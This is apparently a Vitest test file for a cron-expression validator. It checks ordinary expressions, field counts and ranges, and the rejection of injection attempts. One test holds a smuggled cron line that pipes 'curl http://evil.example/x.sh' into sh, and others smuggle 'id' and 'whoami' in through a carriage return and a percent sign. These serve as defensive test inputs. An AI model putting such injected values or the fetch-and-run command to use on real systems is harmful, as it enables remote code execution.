import { describe, it, expect } from 'vitest';
import { isValidCronExpression } from '../../../electron/utils/cron-parser';

describe('isValidCronExpression', () => {
  it('accepts ordinary expressions', () => {
    // given -> when -> then
    expect(isValidCronExpression('*/15 * * * *')).toBe(true);
    expect(isValidCronExpression('0 9 * * 1-5')).toBe(true);
    expect(isValidCronExpression('0 0 1 1 0')).toBe(true);
    expect(isValidCronExpression('5,10,15 */2 * * *')).toBe(true);
    expect(isValidCronExpression('  0   9   *   *   *  ')).toBe(true);
  });

  it('rejects newline injection', () => {
    // given
    const injected = '0 9 * * *\n* * * * * curl http://evil.example/x.sh | sh';

    // when -> then
    expect(isValidCronExpression(injected)).toBe(false);
    expect(isValidCronExpression('0 9 * * *\r* * * * * id')).toBe(false);
  });

  it('rejects a percent sign, which cron treats as end-of-command', () => {
    expect(isValidCronExpression('0 9 * * *%whoami')).toBe(false);
  });

  it('rejects the wrong number of fields', () => {
    expect(isValidCronExpression('0 9 * *')).toBe(false);
    expect(isValidCronExpression('0 9 * * * *')).toBe(false);
    expect(isValidCronExpression('')).toBe(false);
  });

  it('rejects out-of-range and malformed values', () => {
    expect(isValidCronExpression('60 * * * *')).toBe(false);
    expect(isValidCronExpression('* 24 * * *')).toBe(false);
    expect(isValidCronExpression('* * 0 * *')).toBe(false);
    expect(isValidCronExpression('* * * 13 *')).toBe(false);
    expect(isValidCronExpression('* * * * 8')).toBe(false);
    expect(isValidCronExpression('*/0 * * * *')).toBe(false);
    expect(isValidCronExpression('a * * * *')).toBe(false);
    expect(isValidCronExpression('1-2-3 * * * *')).toBe(false);
  });
});
